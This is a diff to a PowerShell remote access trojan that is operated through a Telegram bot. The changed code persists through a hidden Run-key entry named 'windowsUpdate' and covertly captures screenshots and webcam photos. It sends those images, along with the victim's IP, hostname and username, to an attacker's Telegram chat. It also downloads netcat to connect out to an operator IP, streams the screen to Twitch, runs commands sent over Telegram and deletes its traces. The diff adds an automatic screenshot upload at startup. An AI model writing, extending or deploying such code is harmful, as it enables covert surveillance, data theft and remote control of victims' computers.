@@ -82,7 +82,7 @@ function backdoor {
         # Check backdoor
         #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
+        Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
 		
         # Backdoor on startup programs
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
@@ -90,6 +90,10 @@ function backdoor {
 }
 
 function screenshot {
+      Send-Message "Getting resolution.. "
+      $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription.split("x",3)[0]
+      $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription.split("x",3)[1]
+      Send-Message "* $height x $width"
       [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
         function screenshot([Drawing.Rectangle]$bounds, $path) {
            $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
@@ -102,26 +106,26 @@ function screenshot {
            $graphics.Dispose()
            $bmp.Dispose()
         }
-        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
+        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $height, $width)
         screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
 }
 
 function cleanAll {
     # Remove screenshots
-    Send-Message "Deleting_screenshots.."
+    Send-Message "Deleting screenshots.."
     Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
     # Remove cUrl
-    Send-Message "Deleting_cURL.."
+    Send-Message "Deleting cURL.."
     Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
     # Remove backdoor
-    Send-Message "Deleting_backdoor.."
+    Send-Message "Deleting backdoor.."
     Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
     # Remove webcam
-    Send-Message "Deleting_webcam.."
+    Send-Message "Deleting webcam.."
     Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
     # Remove netcat
-    Send-Message "Deleting_netcat.."
+    Send-Message "Deleting netcat.."
     Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
     Remove-Item "C:\Users\$env:username\Documents\nc.zip"
 }
@@ -146,7 +150,7 @@ function installCurl {
 }
 
 function sendPhoto {
-    Send-Message "Sending.."
+    Send-Message "Sending screenshot.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
@@ -154,22 +158,23 @@ function sendPhoto {
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
-    Send-Message "Deleting.."
+    Send-Message "Deleting screenshot.."
     Remove-Item $photo
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
 
 function Send-Message($message) {
+    $message = "     " + $message
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
+    $argumenlist = $uri + " -F chat_id=" + "$ChatID" + " -F text=""  $message  "" -k "
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 function ipPublic {
     #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
+    Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
 }
 
 function download($FileToDownload) {
@@ -262,19 +267,19 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 function webcam {
-    Send-Message "Downloading.."
+    Send-Message "Downloading CommandCam.."
     # https://batchloaf.wordpress.com/commandcam/
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
 
-    Send-Message "Taking_picture.."
+    Send-Message "Taking picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
     Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
     Start-Sleep -Seconds 5
 
-    Send-Message "Sending_picture.."
+    Send-Message "Sending picture.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
@@ -282,7 +287,7 @@ function webcam {
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
-    Send-Message "Deleting_picture.."
+    Send-Message "Deleting picture.."
     Remove-Item $photo
     Remove-Item $outpath
 }
@@ -520,7 +525,7 @@ public static void SwitchRightVirtualDesktopInWin10()
 }
 
 function netcat($ip) {
-    Send-Message "Downloading_netcat.."
+    Send-Message "Downloading netcat.."
     $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
@@ -534,30 +539,30 @@ function netcat($ip) {
 
     Start-Sleep -Seconds 5
     Send-Message "Connecting.."
-    Send-Message "IP:$ip"
-    Send-Message "Port:8888"
+    Send-Message "IP: $ip"
+    Send-Message "Port: 8888"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
 }
 
 function stopnetcat {
-    Send-Message "Stopping_netcat.."
+    Send-Message "Stopping netcat.."
     taskkill /F /IM nc.exe
     
     Sleep -Seconds 5
-    Send-Message "Deleting_netcat.."
+    Send-Message "Deleting netcat.."
     Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
     Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
 }
 
 function twitch($STREAM_KEY) {
-    Send-Message "Downloading_FFmpeg.."
+    Send-Message "Downloading FFmpeg.."
     $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
     $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
 
-    Send-Message "Starting_streaming.."
+    Send-Message "Starting streaming.."
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
     $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
@@ -607,6 +612,8 @@ Invoke-WebRequest -UseBasicParsing `
     -ContentType "application/json;charset=utf-8" `
     -Body (ConvertTo-Json -Compress -InputObject $payload)
 
+screenshot
+sendPhoto
 
 ######################
 ## WAIT FOR COMMAND ##
@@ -674,16 +681,16 @@ While ($DoNotExit)  {
 		}
 		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
         $pwd = pwd
         $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
-		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
+		Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
 		#The user wants to stop the script
 		write-host "The script will end in 5 seconds"
 		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
-		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
+		$ExitRestResponse = Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
@@ -744,7 +751,7 @@ While ($DoNotExit)  {
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 	  }
 	}
 	
